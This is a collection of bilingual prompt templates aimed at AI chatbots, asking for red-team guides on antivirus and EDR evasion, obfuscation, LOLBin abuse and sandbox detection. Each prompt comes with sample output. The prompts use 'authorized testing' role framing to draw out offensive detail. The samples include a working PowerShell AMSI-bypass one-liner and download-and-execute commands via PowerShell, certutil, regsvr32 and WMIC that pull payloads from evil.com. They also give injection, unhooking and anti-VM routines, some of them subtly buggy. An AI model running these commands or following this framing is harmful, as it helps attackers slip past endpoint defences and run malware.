# Evasion Techniques Prompts Collection

This document contains 5 detailed bilingual (English/Arabic) prompts about various evasion techniques used in red team operations and penetration testing.

---

## Prompt 1: AV Evasion Techniques

### Description
Comprehensive guide to understanding and implementing antivirus evasion techniques for red team operations, including signature-based detection bypass and heuristic analysis avoidance.

### Tags
`antivirus-evasion` `signature-bypass` `red-team` `malware-analysis` `security-testing`

---

## 🇬🇧 English Prompt

```
You are a senior red team operator tasked with developing educational content about antivirus evasion techniques for authorized penetration testing scenarios. Provide a comprehensive technical guide covering:

1. **Signature-Based Detection Bypass**:
   - Techniques for modifying malicious code signatures
   - Polymorphic and metamorphic code generation principles
   - Hash collision avoidance methods
   - Import table manipulation and API hashing

2. **Heuristic Analysis Evasion**:
   - Behavioral pattern obfuscation
   - Suspicious API call sequences modification
   - Anti-debugging and anti-VM techniques
   - Code flow obfuscation methods

3. **Memory-Based Execution**:
   - Shellcode execution in memory without disk artifacts
   - Process injection techniques (DLL injection, process hollowing, APC injection)
   - Reflective DLL loading implementation
   - Module stomping and transacted hollowing

4. **Practical Code Examples**:
   Provide pseudocode examples demonstrating:
   - XOR encoding/decoding routines
   - API unhooking techniques
   - AMSI bypass methods

5. **Countermeasures and Detection**:
   - How blue teams can detect these techniques
   - Modern EDR solutions and behavior monitoring
   - Signature-less detection methods

Ensure all content is framed within ethical hacking and authorized testing contexts.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
أنت مشغل أول في فريق أحمر (Red Team) مكلف بتطوير محتوى تعليمي حول تقنيات التهرب من برامج مكافحة الفيروسات لسيناريوهات اختبار الاختراق المصرح بها. قدم دليلاً تقنياً شاملاً يغطي:

1. **تجاوز الكشف القائم على التوقيع**:
   - تقنيات تعديل توقيعات التعليمات البرمجية الخبيثة
   - مبادئ توليد التعليمات البرمجية متعددة الأشكال والمتحولة
   - طرق تجنب تصادم التجزئة (Hash Collision)
   - التلاعب بجدول الاستيراد وتجزئة واجهات برمجة التطبيقات (API Hashing)

2. **التهرب من التحليل الاستدلالي**:
   - التشويش على الأنماط السلوكية
   - تعديل تسلسلات استدعاءات API المشبوهة
   - تقنيات مكافحة التصحيح ومكافحة الآلة الافتراضية
   - طرق التشويش على تدفق الكود

3. **التنفيذ القائم على الذاكرة**:
   - تنفيذ الشيل كود في الذاكرة بدون آثار على القرص
   - تقنيات حقن العمليات (حقن DLL، تجويف العمليات، حقن APC)
   - تنفيذ تحميل DLL الانعكاسي
   - تقنية خطف الوحدات النمطية (Module Stomping)

4. **أمثلة عملية للكود**:
   قدم أمثلة بالكود الزائف توضح:
   - روتينات التشفير/فك التشفير XOR
   - تقنيات إزالة خطاطيف API
   - طرق تجاوز AMSI

5. **التدابير المضادة والكشف**:
   - كيف يمكن للفرق الزرقاء اكتشاف هذه التقنيات
   - حلول EDR الحديثة ومراقبة السلوك
   - طرق الكشف بدون التوقيعات

تأكد من صياغة جميع المحتويات في سياق الاختراق الأخلاقي والاختبارات المصرح بها.
```

---

## Example Output Preview

```
## XOR Encoding Example (Pseudocode)

function XOR_Decode(data, key):
    result = allocate_memory(length(data))
    for i = 0 to length(data):
        result[i] = data[i] XOR key[i % length(key)]
    return result

## AMSI Bypass Technique

// Patch AMSI DLL in memory to return AMSI_RESULT_CLEAN
amsi_dll = GetModuleHandle("amsi.dll")
amsi_scan_buffer = GetProcAddress(amsi_dll, "AmsiScanBuffer")
WriteProcessMemory(amsi_scan_buffer, patch_bytes, 6)

## Process Injection Flow

1. Open target process with PROCESS_ALL_ACCESS
2. Allocate memory in target process (MEM_COMMIT | MEM_RESERVE)
3. Write shellcode to allocated memory
4. Create remote thread pointing to shellcode address
5. Wait for execution completion
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 2: EDR Bypass Methods

### Description
Advanced techniques for bypassing Endpoint Detection and Response (EDR) systems in authorized security assessments, focusing on kernel-level evasion and user-mode hooking bypass.

### Tags
`edr-bypass` `kernel-evasion` `hooking` `endpoint-security` `red-team`

---

## 🇬🇧 English Prompt

```
Act as an advanced red team specialist providing educational content on EDR bypass methodologies for authorized security assessments. Create a detailed technical guide addressing:

1. **User-Land Hooking Bypass**:
   - Direct system calls implementation (Syscalls)
   - Unhooking techniques for ntdll.dll and kernel32.dll
   - Hell's Gate and Halo's Gate techniques
   - Peruns Fart technique for fresh DLL copies

2. **Kernel-Callback Evasion**:
   - Understanding Process Creation callbacks (PsSetCreateProcessNotifyRoutine)
   - Image Load callbacks evasion
   - Thread Creation callback bypass
   - Object callbacks and mini-filter evasion

3. **EDR Telemetry Disruption**:
   - ETW (Event Tracing for Windows) patching
   - Kernel callback removal techniques
   - Blind EDR sensors through driver manipulation
   - AMSI and ELAM bypass strategies

4. **Injection Techniques Evolution**:
   - Classic injection detection and alternatives
   - Process Doppelgängering
   - Process Herpaderping
   - Early Bird injection (APC queue injection)
   - Shellcode execution via callbacks (ThreadPool, Fibers)

5. **Operational Security Considerations**:
   - Log deletion and event log manipulation
   - OPSEC-safe execution patterns
   - EDR blind spot identification methodology

Include pseudocode examples for direct syscall implementation and unhooking procedures.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
تصرف كمتخصص متقدم في الفريق الأحمر يقدم محتوى تعليمياً حول منهجيات تجاوز EDR لتقييمات الأمان المصرح بها. أنشئ دليلاً تقنياً مفصلاً يعالج:

1. **تجاوز الخطاطفة في وضع المستخدم (User-Land Hooking)**:
   - تنفيذ استدعاءات النظام المباشرة (Syscalls)
   - تقنيات إزالة الخطاطفة من ntdll.dll و kernel32.dll
   - تقنيات Hell's Gate و Halo's Gate
   - تقنية Peruns Fart للحصول على نسخ DLL جديدة

2. **التهرب من استدعاءات النواة**:
   - فهم استدعاءات إنشاء العمليات (PsSetCreateProcessNotifyRoutine)
   - التهرب من استدعاءات تحميل الصور
   - تجاوز استدعاءات إنشاء الخيوط
   - التهرب من استدعاءات الكائنات والفلاتر المصغرة

3. **تعطيل بيانات القياس عن بُعد لـ EDR**:
   - تعديل ETW (تتبع أحداث ويندوز)
   - تقنيات إزالة استدعاءات النواة
   - تعمية مستشعرات EDR من خلال التلاعب بالبرامج التشغيل
   - استراتيجيات تجاوز AMSI و ELAM

4. **تطور تقنيات الحقن**:
   - كشف الحقن التقليدي والبدائل
   - Process Doppelgängering (تزييف العمليات)
   - Process Herpaderping (تشويه العمليات)
   - حقن Early Bird (حقن قائمة APC)
   - تنفيذ الشيل كود عبر الاستدعاءات (ThreadPool، الألياف)

5. **اعتبارات الأمن التشغيلي**:
   - حذف السجلات والتلاعب بسجلات الأحداث
   - أنماط التنفيذ الآمنة للـ OPSEC
   - منهجية تحديد نقاط العمى في EDR

ضمن أمثلة بالكود الزائف لتنفيذ Syscalls المباشرة وإجراءات إزالة الخطاطفة.
```

---

## Example Output Preview

```
## Direct Syscall Implementation (Pseudocode)

// Define syscall stub structure
struct SYSCALL_STUB {
    DWORD syscall_number;
    BYTE stub_bytes[16];
};

// Get syscall number from ntdll
function GetSyscallNumber(function_name):
    ntdll = GetModuleHandle("ntdll.dll")
    func_ptr = GetProcAddress(ntdll, function_name)
    // Parse syscall number from function bytes
    return *(DWORD*)(func_ptr + 4)

// Execute direct syscall
NtAllocateVirtualMemory_Direct(pid, base_addr, size):
    syscall_num = GetSyscallNumber("NtAllocateVirtualMemory")
    return execute_syscall(syscall_num, pid, base_addr, size)

## NTDLL Unhooking Process

1. Load fresh ntdll.dll from disk to memory
2. Parse section headers to find .text section
3. Calculate virtual address of .text section
4. Copy fresh .text section to current process ntdll
5. Verify unhooking success

## Hell's Gate Technique

// Resolve syscall numbers dynamically by parsing ntdll stubs
for each export in ntdll:
    if export starts with "Nt":
        parse syscall_number from instruction bytes
        store syscall_number for direct invocation
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 3: Code Obfuscation

### Description
Comprehensive coverage of code obfuscation techniques for protecting software and evading static analysis, applicable to both defensive security and authorized red team operations.

### Tags
`obfuscation` `code-protection` `static-analysis` `anti-reverse` `malware-dev`

---

## 🇬🇧 English Prompt

```
As a software security expert specializing in code protection and obfuscation, provide an extensive technical guide covering modern code obfuscation techniques. Structure your response as follows:

1. **Control Flow Obfuscation**:
   - Control flow flattening implementation
   - Bogus control flow insertion
   - Opaque predicates construction
   - Switch case transformation
   - Loop unrolling and transformation

2. **Data Obfuscation Methods**:
   - String encryption and dynamic decryption
   - Constant unfolding and folding
   - Data encoding schemes (XOR, Base64, AES)
   - Dead code insertion techniques
   - Variable renaming and splitting

3. **Binary-Level Obfuscation**:
   - PE header manipulation
   - Section name obfuscation
   - Import address table (IAT) obfuscation
   - Entry point obfuscation
   - Overlay data techniques

4. **Anti-Analysis Techniques**:
   - Anti-debugging checks (IsDebuggerPresent, CheckRemoteDebugger)
   - Anti-VM detection (CPUID, registry checks, MAC address)
   - Anti-sandbox methods (timing checks, mouse movement, hardware checks)
   - Anti-disassembly tricks (rogue bytes, self-modifying code)

5. **Modern Obfuscation Tools and Frameworks**:
   - LLVM-based obfuscation passes
   - Commercial and open-source packers
   - Custom obfuscation pipeline design
   - Obfuscation effectiveness metrics

Provide practical pseudocode examples demonstrating each obfuscation category and discuss detection challenges.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
بصفتك خبيراً في أمن البرمجيات متخصصاً في حماية الكود والتشويش، قدم دليلاً تقنياً شاملاً يغطي تقنيات تشويش الكود الحديثة. رتب إجابتك على النحو التالي:

1. **تشويش تدفق التحكم**:
   - تنفيذ تسطيح تدفق التحكم (Control Flow Flattening)
   - إدراج تدفق تحكم وهمي
   - بناء المسندات المعتمة (Opaque Predicates)
   - تحويل جمل switch
   - فك وتحويل الحلقات

2. **طرق تشويش البيانات**:
   - تشفير النصوص وفك التشفير الديناميكي
   - تفكيك وطي الثوابت
   - مخططات ترميز البيانات (XOR، Base64، AES)
   - تقنيات إدراج الكود الميت
   - إعادة تسمية المتغيرات وتقسيمها

3. **التشويش على مستوى الثنائي**:
   - التلاعب برأس PE
   - تشويش أسماء الأقسام
   - تشويش جدول عناوين الاستيراد (IAT)
   - تشويش نقطة الدخول
   - تقنيات بيانات التراكب (Overlay)

4. **تقنيات مكافحة التحليل**:
   - فحوصات مكافحة التصحيح (IsDebuggerPresent، CheckRemoteDebugger)
   - كشف الآلة الافتراضية (CPUID، فحوصات السجل، عنوان MAC)
   - طرق مكافحة الصندوق الرملي (فحوصات التوقيت، حركة الفأرة، فحوصات الأجهزة)
   - حيل مكافحة فك التجميع (بايتات خادعة، كود معدل ذاتياً)

5. **أدوات وأطر التشويش الحديثة**:
   - ممررات التشويش القائمة على LLVM
   - برامج التعبئة التجارية والمفتوحة المصدر
   - تصميم خط أنابيب التشويش المخصص
   - مقاييس فعالية التشويش

قدم أمثلة عملية بالكود الزائف توضح كل فئة تشويش وناقش تحديات الكشف.
```

---

## Example Output Preview

```
## Control Flow Flattening Example

// Original Code
function check_license(key):
    if key == "VALID":
        return true
    else:
        return false

// Obfuscated Code
function check_license_obfuscated(key):
    state = 0
    while true:
        switch state:
            case 0: state = 1; break
            case 1: 
                temp = key XOR 0x56
                state = (temp == 0x1A) ? 2 : 3
                break
            case 2: return true
            case 3: return false
            default: state = 0

## String Encryption Example

// Encrypted strings at compile time
encrypted_key = [0x1A, 0x0F, 0x5B, 0x23, 0x11]

function decrypt_string(enc_str, key):
    result = ""
    for i in enc_str:
        result += chr(i XOR key[i % len(key)])
    return result

## Anti-Debug Check

function anti_debug():
    if IsDebuggerPresent():
        ExitProcess(0)
    if CheckRemoteDebuggerPresent(GetCurrentProcess()):
        ExitProcess(0)
    // Timing check
    start = RDTSC()
    Sleep(100)
    end = RDTSC()
    if (end - start) < 200000000:  // Too fast = VM/Debugger
        ExitProcess(0)
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 4: Living Off The Land (LOLBins)

### Description
Detailed exploration of Living Off The Land techniques using legitimate Windows binaries (LOLBins) for post-exploitation activities in authorized penetration testing engagements.

### Tags
`lolbins` `living-off-the-land` `post-exploitation` `windows-security` `red-team`

---

## 🇬🇧 English Prompt

```
Act as a red team operator specializing in Living Off The Land techniques for authorized penetration testing. Create a comprehensive guide covering LOLBin abuse methodologies:

1. **Execution LOLBins**:
   - PowerShell (bypass techniques, constrained language mode)
   - Certutil (download and encode operations)
   - Regsvr32 (SCT file execution, COM scriptlets)
   - Mshta (HTA file execution, VBScript payload)
   - WMIC (XSL script execution, remote execution)
   - Msbuild (inline task execution, C# compilation)
   - InstallUtil (Assembly execution, log file abuse)

2. **Persistence LOLBins**:
   - Scheduled tasks manipulation (schtasks)
   - BITSAdmin for background downloads
   - Service creation and manipulation (sc.exe)
   - Registry run keys and startup folders
   - WMI event subscriptions

3. **Defense Evasion with LOLBins**:
   - Application whitelisting bypass
   - AppLocker policy abuse
   - AMSI bypass through LOLBin execution
   - Signed binary proxy execution

4. **Discovery and Reconnaissance**:
   - Net commands for domain enumeration
   - Dsquery for Active Directory queries
   - Nltest for domain trust enumeration
   - Dnscmd for DNS reconnaissance

5. **LOLBins Detection and Mitigation**:
   - Event log monitoring for LOLBin abuse
   - Behavioral analysis patterns
   - PowerShell logging and script block logging
   - Command-line auditing best practices

For each LOLBin, provide:
- Syntax examples
- Detection opportunities (Event IDs, Sysmon)
- OPSEC considerations
- Alternative methods
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
تصرف كمشغل فريق أحمر متخصص في تقنيات العيش على الأرض لاختبار الاختراق المصرح به. أنشئ دليلاً شاملاً يغطي منهجيات إساءة استخدام LOLBins:

1. **LOLBins للتنفيذ**:
   - PowerShell (تقنيات التجاوز، وضع اللغة المقيد)
   - Certutil (عمليات التحميل والترميز)
   - Regsvr32 (تنفيذ ملفات SCT، مكونات COM النصية)
   - Mshta (تنفيذ ملفات HTA، حمولة VBScript)
   - WMIC (تنفيذ سكريبت XSL، التنفيذ عن بُعد)
   - Msbuild (تنفيذ المهام المضمنة، تجميع C#)
   - InstallUtil (تنفيذ التجميعات، إساءة استخدام ملفات السجل)

2. **LOLBins للاستمرارية**:
   - التلاعب بالمهام المجدولة (schtasks)
   - BITSAdmin للتنزيلات الخلفية
   - إنشاء ومعالجة الخدمات (sc.exe)
   - مفاتيح التشغيل في السجل ومجلدات بدء التشغيل
   - اشتراكات أحداث WMI

3. **التهرب من الدفاعات باستخدام LOLBins**:
   - تجاوز القائمة البيضاء للتطبيقات
   - إساءة استخدام سياسة AppLocker
   - تجاوز AMSI من خلال تنفيذ LOLBin
   - تنفيذ البروكسي الثنائي الموقع

4. **الاكتشاف والاستطلاع**:
   - أوامر Net لتعداد النطاق
   - Dsquery لاستعلامات Active Directory
   - Nltest لتعداد ثقة النطاق
   - Dnscmd لاستطلاع DNS

5. **الكشف والتخفيف من LOLBins**:
   - مراقبة سجلات الأحداث لإساءة استخدام LOLBin
   - أنماط التحليل السلوكي
   - تسجيل PowerShell وتسجيل كتل البرنامج النصي
   - أفضل ممارسات تدقيق سطر الأوامر

لكل LOLBin، قدم:
- أمثلة على الصيغة
- فرص الكشف (معرفات الأحداث، Sysmon)
- اعتبارات OPSEC
- الطرق البديلة
```

---

## Example Output Preview

```
## PowerShell Execution Examples

// Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -File malicious.ps1
powershell.exe -ep Bypass -WindowStyle Hidden -nop -c "IEX(New-Object Net.WebClient).downloadString('http://evil.com/payload.ps1')"

// AMSI Bypass in PowerShell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

## Certutil Download

certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe
certutil.exe -decode encoded_payload.txt payload.exe

## Regsvr32 Remote Execution

regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll

## WMIC XSL Execution

wmic os get /FORMAT:"http://evil.com/payload.xsl"

## Msbuild Inline Task

msbuild.exe malicious.csproj
// Contains inline C# task that executes shellcode

## Detection Event IDs

- Event ID 4688: Process creation
- Event ID 1: Sysmon process creation
- Event ID 400: PowerShell engine lifecycle
- Event ID 4104: PowerShell script block execution
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 5: Sandbox Detection

### Description
Advanced sandbox and virtual machine detection techniques for understanding how malware evades automated analysis systems, critical for both red team operations and blue team defense.

### Tags
`sandbox-detection` `vm-detection` `anti-analysis` `malware-analysis` `red-team`

---

## 🇬🇧 English Prompt

```
As a malware analyst and red team specialist, provide an in-depth technical guide on sandbox and virtual machine detection techniques used in modern malware. Cover both detection methodologies and counter-detection approaches:

1. **Hardware-Based Detection**:
   - CPU feature checks (CPUID hypervisor bit)
   - RDTSC timing analysis (instruction timing discrepancies)
   - Hardware device enumeration (MAC address patterns, disk serial numbers)
   - CPU core count and cache analysis
   - Memory size and architecture checks

2. **Software-Based Detection**:
   - Registry keys indicating VM presence
   - Running processes (vmtoolsd.exe, VBoxService.exe, qemu-ga.exe)
   - Service enumeration (VMware Tools, VirtualBox Guest Additions)
   - File system artifacts (driver files, DLLs)
   - Network adapter names and MAC address prefixes

3. **Behavioral Detection**:
   - User interaction checks (mouse movement, keyboard activity)
   - System uptime analysis (recently booted systems)
   - Network connectivity and internet access checks
   - Sandbox-specific artifacts (JosephSandbox, Cuckoo traces)
   - Debug port detection

4. **Timing-Based Techniques**:
   - RDTSC instruction timing analysis
   - Sleep acceleration detection
   - Execution speed comparison
   - Multi-core timing discrepancies

5. **Counter-Detection and Mitigation**:
   - How sandboxes are evolving to evade detection
   - Building analysis-resistant sandboxes
   - Breakpoints and hooks detection
   - Anti-sandbox bypass techniques for legitimate analysis

Provide pseudocode examples for each detection category and discuss implementation in C/C++ and assembly.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
بصفتك محلل برمجيات خبيثة ومتخصصاً في الفريق الأحمر، قدم دليلاً تقنياً معمقاً حول تقنيات كشف الصناديق الرملية والآلات الافتراضية المستخدمة في البرمجيات الخبيثة الحديثة. غطِ منهجيات الكشف ونهج مكافحة الكشف:

1. **الكشف القائم على الأجهزة**:
   - فحوصات ميزات المعالج (بت المراقب في CPUID)
   - تحليل توقيت RDTSC (اختلافات توقيت التعليمات)
   - تعداد الأجهزة (أنماط عناوين MAC، الأرقام التسلسلية للأقراص)
   - تحليل عدد نوى المعالج وذاكرة التخزين المؤقت
   - فحوصات حجم الذاكرة والبنية

2. **الكشف القائم على البرمجيات**:
   - مفاتيح السجل التي تشير إلى وجود آلة افتراضية
   - العمليات الجارية (vmtoolsd.exe، VBoxService.exe، qemu-ga.exe)
   - تعداد الخدمات (VMware Tools، VirtualBox Guest Additions)
   - آثار نظام الملفات (ملفات البرامج التشغيل، ملفات DLL)
   - أسماء محولات الشبكة وبادئات عناوين MAC

3. **الكشف السلوكي**:
   - فحوصات تفاعل المستخدم (حركة الفأرة، نشاط لوحة المفاتيح)
   - تحليل وقت تشغيل النظام (الأنظمة المُقلعة حديثاً)
   - فحوصات اتصال الشبكة والوصول للإنترنت
   - آثار الصناديق الرملية المحددة (JosephSandbox، آثار Cuckoo)
   - كشف منفذ التصحيح

4. **تقنيات التوقيت**:
   - تحليل توقيت تعليمة RDTSC
   - كشف تسريع السكون (Sleep acceleration)
   - مقارنة سرعة التنفيذ
   - اختلافات التوقيت متعددة النوى

5. **مكافحة الكشف والتخفيف**:
   - كيف تتطور الصناديق الرملية للتهرب من الكشف
   - بناء صناديق رملية مقاومة للتحليل
   - كشف نقاط التوقف والخطاطيف
   - تقنيات تجاوز مكافحة الصندوق الرملي للتحليل الشرعي

قدم أمثلة بالكود الزائف لكل فئة كشف وناقش التنفيذ بلغة C/C++ والتجمع.
```

---

## Example Output Preview

```
## CPUID Hypervisor Check (Assembly)

check_hypervisor:
    xor eax, eax
    cpuid              ; Basic CPUID
    cmp ecx, 0x7061749 ; "para" - Parallels check
    
    mov eax, 0x40000000
    cpuid              ; Hypervisor vendor leaf
    ; Returns hypervisor signature in EBX, ECX, EDX
    
    ; Check hypervisor bit in feature flags
    mov eax, 1
    cpuid
    bt ecx, 31         ; Hypervisor present bit
    jc hypervisor_detected

## RDTSC Timing Check (C Pseudocode)

function check_timing():
    start = __rdtsc()
    Sleep(1000)        // Sleep for 1 second
    end = __rdtsc()
    cycles_per_second = end - start
    
    // Real hardware: ~3 billion cycles/second
    // VM/Sandbox: Often much slower or accelerated
    if cycles_per_second < 1000000000 or cycles_per_second > 10000000000:
        return SANDBOX_DETECTED
    return SANDBOX_NOT_DETECTED

## VM Process Detection

blacklist = [
    "vmtoolsd.exe", "VBoxService.exe", "VBoxTray.exe",
    "qemu-ga.exe", "xenstored.exe", "vmwaretray.exe"
]

function check_processes():
    processes = EnumProcesses()
    for proc in processes:
        if proc.name.lower() in blacklist:
            return VM_DETECTED
    return VM_NOT_DETECTED

## Mouse Movement Detection

function check_mouse_interaction():
    initial_pos = GetCursorPos()
    Sleep(60000)       // Wait 1 minute
    final_pos = GetCursorPos()
    
    if initial_pos == final_pos:
        return SANDBOX_DETECTED    // No user interaction
    return SANDBOX_NOT_DETECTED

## Known VM MAC Address Prefixes

vm_mac_prefixes = [
    "00:0C:29",    // VMware
    "00:50:56",    // VMware
    "00:1C:14",    // VMware
    "08:00:27",    // VirtualBox
    "52:54:00",    // QEMU
    "00:16:3E"     // Xen
]

function check_mac_address():
    adapters = GetNetworkAdapters()
    for adapter in adapters:
        for prefix in vm_mac_prefixes:
            if adapter.mac.startswith(prefix):
                return VM_DETECTED
    return VM_NOT_DETECTED
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team
